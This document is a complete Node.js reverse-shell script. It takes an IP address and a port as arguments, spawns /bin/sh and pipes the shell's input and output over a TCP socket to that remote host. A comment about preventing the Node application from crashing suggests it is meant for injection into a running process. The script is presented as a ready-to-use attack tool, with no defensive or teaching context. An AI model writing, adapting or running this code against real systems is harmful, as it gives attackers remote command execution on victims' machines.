(function(){
    // Basename
    var path = require('path');
    var basename = path.basename(__filename);

    // Create CLI interface with arguments
    var args = process.argv.slice(2);
    console.log(args);
    if (args.length < 1) {
        console.log("usage: "+ basename +" [-h] IP PORT");
        console.log(basename + ": error: the following arguments are required: IP, PORT");
        return -1;
    }

    if (args.length < 2) {
        console.log("usage: "+ basename +" [-h] PORT");
        console.log(basename + ": error: the following arguments are required: PORT");
        return -1;
    }

    if (args.length > 2) {
        console.log("usage: "+ basename +" [-h] IP PORT");
        console.log(basename + ": error: unrecognized arguments: ", args.slice(2));
        return -1;
    }

    // Parse arguments
    ip_addr = args[0];
    port = parseInt(args[1]);

    // Spawn a child process with the reverse shell
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);

    // Create a Network Socket
    var client = new net.Socket();

    // Connect to remote Machine
    client.connect(port, ip_addr, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

